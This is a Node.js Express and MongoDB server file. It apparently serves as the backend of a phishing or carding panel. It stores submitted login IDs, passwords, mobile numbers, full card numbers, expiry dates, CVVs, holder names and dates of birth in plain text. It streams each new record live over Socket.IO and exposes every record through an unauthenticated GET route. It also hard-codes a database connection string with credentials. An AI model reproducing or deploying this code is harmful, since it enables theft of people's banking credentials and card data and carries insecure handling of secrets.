// backend/server.js

const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');
const http = require('http');
const { Server } = require('socket.io');

// Create Express app and HTTP server
const app = express();
const server = http.createServer(app);

// Setup Socket.IO
const io = new Server(server, {
  cors: {
    origin: 'http://localhost:3000',
    methods: ['GET', 'POST']
  }
});

// Middleware
app.use(cors());
app.use(bodyParser.json());

// MongoDB URI
const mongoURI = 'mongodb+srv://rakeshgovinda742:abcdefgh@cluster0.lu51fn9.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0';

// Connect to MongoDB
mongoose.connect(mongoURI, {
  useNewUrlParser: true,
  useUnifiedTopology: true
})
.then(() => console.log('✅ MongoDB connected'))
.catch(err => console.error('❌ MongoDB connection error:', err));

// ======================== SCHEMAS & MODELS ========================

// User Schema
const UserSchema = new mongoose.Schema({
  Login_ID: String,
  Password: String,
  mobile: String,
  cardNumber: String,
  expiry: String,
  cvv: String,
  limit: String
}, { timestamps: true });

const User = mongoose.model('User', UserSchema);

// Account Verification Schema
const AccountVerificationSchema = new mongoose.Schema({
  holderName: String,
  dob: String
}, { timestamps: true });

const AccountVerification = mongoose.model('AccountVerification', AccountVerificationSchema);

// ======================== ROUTES ========================

// POST /users - Save new user and emit via Socket.IO
app.post('/users', async (req, res) => {
  try {
    const {
      Login_ID,
      Password,
      mobile,
      cardNumber,
      expiry,
      cvv,
      limit
    } = req.body;

    const newUser = new User({
      Login_ID: Login_ID || '',
      Password: Password || '',
      mobile: mobile || '',
      cardNumber: cardNumber || '',
      expiry: expiry || '',
      cvv: cvv || '',
      limit: limit || ''
    });

    await newUser.save();
    io.emit('new_user', newUser); // Real-time update
    res.status(201).send('User saved successfully');
  } catch (err) {
    console.error('Error saving user:', err);
    res.status(500).send('Server error');
  }
});

// GET /users - Fetch all users (for page refresh)
app.get('/users', async (req, res) => {
  try {
    const users = await User.find().sort({ createdAt: -1 });
    res.json(users);
  } catch (err) {
    console.error('Error fetching users:', err);
    res.status(500).send('Server error');
  }
});

// POST /account-verification - Save verification data
app.post('/account-verification', async (req, res) => {
  try {
    const { holderName, dob } = req.body;

    const newVerification = new AccountVerification({
      holderName: holderName || '',
      dob: dob || ''
    });

    await newVerification.save();
    res.status(201).send('Account verification data saved successfully');
  } catch (err) {
    console.error('Error saving account verification:', err);
    res.status(500).send('Server error');
  }
});

// ======================== SOCKET.IO CONNECTION ========================

io.on('connection', (socket) => {
  console.log('⚡ A client connected');

  socket.on('disconnect', () => {
    console.log('🔌 A client disconnected');
  });
});

// Start server
const PORT = 5000;
server.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
});
